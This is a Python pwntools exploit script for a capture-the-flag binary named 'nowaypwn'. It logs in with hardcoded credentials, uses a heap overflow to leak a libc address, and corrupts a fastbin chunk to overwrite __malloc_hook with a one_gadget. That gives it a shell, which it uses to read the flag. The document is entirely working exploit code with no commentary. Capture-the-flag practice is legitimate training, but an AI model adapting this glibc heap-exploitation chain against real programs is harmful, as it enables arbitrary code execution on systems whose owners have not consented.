#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
	p = process('./nowaypwn')
	elf = ELF('./nowaypwn')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	pass

def choice(c):
    p.sendline(str(c))

def add(sz):
    choice(1)
    p.sendline(str(sz))

def delete(idx):
    choice(2)
    p.sendline(str(idx))

def edit(idx, data, of=False):
    choice(3)
    p.sendline(str(idx))
    if of:
        p.send(0x66 * 'A')
    p.send(data)

def show(idx):
    choice(4)
    p.sendline(str(idx))

password = 'skdmaje1'

p.recvuntil('Give me your name:\n')
p.sendline('b3ale')
p.recvuntil('Give me your key:\n')
p.sendline('b3ale')
p.recvuntil('Input your password!:\n')
p.sendline(password)

# leak
add(0x66) # 0
add(0x98) # 1
add(0x8) # 2
delete(1)
edit(0, 0x70 * 'A', of=True)
show(0)
p.recvuntil(0x70 * 'A')
malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 0x68
libc_base = malloc_hook - libc.symbols['__malloc_hook']
info('libc_base = ' + hex(libc_base))
edit(0, 0x68 * 'A' + p64(0xa1), of=True)

# write __malloc_hook
realloc = libc_base + libc.symbols['realloc']
add(0x68) # 1
delete(1)
edit(0, 0x68 * 'A' + p64(0x71) + p64(malloc_hook - 0x23), of=True)
if local:
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
else:
    pass
one_gadget = libc_base + one_gadgets[1]
info('one_gadget = ' + hex(one_gadget))
add(0x68) # 1
add(0x68) # 3
edit(3, 0xb * 'A' + p64(one_gadget) + p64(realloc + 0xb))
add(0x8) # 4 # trigger one_gadget

#gdb.attach(p)

p.sendline('cat flag')
flag = p.recvline()
p.sendline('cat flag')
flag = p.recvline()
info('flag = ' + flag)

p.interactive()

